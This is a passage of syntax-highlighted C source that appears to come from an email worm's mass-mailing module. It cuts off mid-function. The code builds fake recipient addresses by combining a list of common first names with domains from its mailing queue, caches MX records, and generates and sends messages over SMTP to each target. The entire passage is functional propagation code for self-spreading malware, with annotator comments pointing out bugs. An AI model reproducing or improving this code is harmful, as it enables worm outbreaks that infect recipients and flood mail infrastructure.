    </span><span class="sc6">"kevin"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"david"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"george"</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc6">"sam"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"andrew"</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc6">"jose"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"leo"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"maria"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"jim"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"brian"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"serg"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"mary"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"ray"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"tom"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"peter"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"robert"</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc6">"bob"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"jane"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"joe"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"dan"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"dave"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"matt"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"steve"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"smith"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"stan"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"bill"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"bob"</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc6">"jack"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"fred"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"ted"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"adam"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"brent"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"alice"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"anna"</span><span class="sc10">,</span><span class="sc0">     </span><span class="sc6">"brenda"</span><span class="sc10">,</span><span class="sc0">   </span><span class="sc6">"claudia"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"debby"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"helen"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"jerry"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"jimmy"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"julie"</span><span class="sc10">,</span><span class="sc0">    </span><span class="sc6">"linda"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"sandra"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc9">#define gen_names_cnt (sizeof(gen_names) / sizeof(gen_names[0]))
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mm_gen</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">queue_total</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">[</span><span class="sc4">128</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">out_mail</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">queue_total</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">queue_total</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">queue_total</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand32</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">queue_total</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">massmail_queue</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">mq</span><span class="sc10">=</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mq</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">=</span><span class="sc11">mq</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpyn</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DOMAIN</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xrand16</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc11">gen_names_cnt</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">lstrcpy</span><span class="sc10">(</span><span class="sc11">out_mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">gen_names</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">out_mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"@"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">lstrcat</span><span class="sc10">(</span><span class="sc11">out_mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">massmail_addq</span><span class="sc10">(</span><span class="sc11">out_mail</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//-----------------------------------------------------------------------------
// DNS caching
</span><span class="sc0">
</span><span class="sc9">#define MMDNS_CACHESIZE 256
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mxlist_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mxs</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">[</span><span class="sc11">MAX_DOMAIN</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">tick_lastused</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ref</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc16">volatile</span><span class="sc0"> </span><span class="sc11">mm_dnscache</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mmdns_getcached</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">=</span><span class="sc11">mm_dnscache</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">=</span><span class="sc11">p</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">lstrcmpi</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">-&gt;</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">mmdns_addcache</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mxlist_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mxs</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_oldest</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p_new</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">cache_size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p_oldest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">=</span><span class="sc11">mm_dnscache</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">cache_size</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">cache_size</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">p_oldest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">tick_lastused</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">-&gt;</span><span class="sc11">tick_lastused</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc11">p_oldest</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cache_size</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">MMDNS_CACHESIZE</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc1">/* FIXME: should try to search for another unused entry */</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc1">/* or: { break; } */</span><span class="sc0">
        </span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">domain</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">tick_lastused</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc11">free_mx_list</span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">mxs</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">lstrcpyn</span><span class="sc10">(</span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DOMAIN</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">mxs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mxs</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">p_oldest</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">p_new</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">HeapAlloc</span><span class="sc10">(</span><span class="sc11">GetProcessHeap</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p_new</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">p_new</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">p_new</span><span class="sc10">-&gt;</span><span class="sc11">mxs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mxs</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpyn</span><span class="sc10">(</span><span class="sc11">p_new</span><span class="sc10">-&gt;</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DOMAIN</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">p_new</span><span class="sc10">-&gt;</span><span class="sc11">tick_lastused</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">p_new</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">p_new</span><span class="sc10">-&gt;</span><span class="sc11">next</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mm_dnscache</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mm_dnscache</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p_new</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mm_get_mx</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">domain</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">cached</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mxlist_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mxs</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">cached</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmdns_getcached</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">cached</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">cached</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">mxs</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">get_mx_list</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">mxs</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">GetTickCount</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mmdns_addcache</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mxs</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">cached</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mmdns_getcached</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">cached</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc1">/* original: */</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc1">/* should be: */</span><span class="sc0">
        </span><span class="sc1">/* { free_mx_list(mxs); return NULL; } */</span><span class="sc0">

    </span><span class="sc11">cached</span><span class="sc10">-&gt;</span><span class="sc11">ref</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">cached</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//-----------------------------------------------------------------------------
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">mmsender</span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mailq_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">email</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">domain</span><span class="sc10">[</span><span class="sc11">MAX_DOMAIN</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dnscache_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mxs_cached</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">mxlist_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">mxs</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">=</span><span class="sc11">email</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">++);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'@'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">lstrcpyn</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DOMAIN</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">mxs_cached</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mm_get_mx</span><span class="sc10">(</span><span class="sc11">domain</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mxs_cached</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">msg_generate</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">-&gt;</span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">ex1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">smtp_send</span><span class="sc10">(</span><span class="sc11">mxs_cached</span><span class="sc10">-&gt;</span><span class="sc11">mxs</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
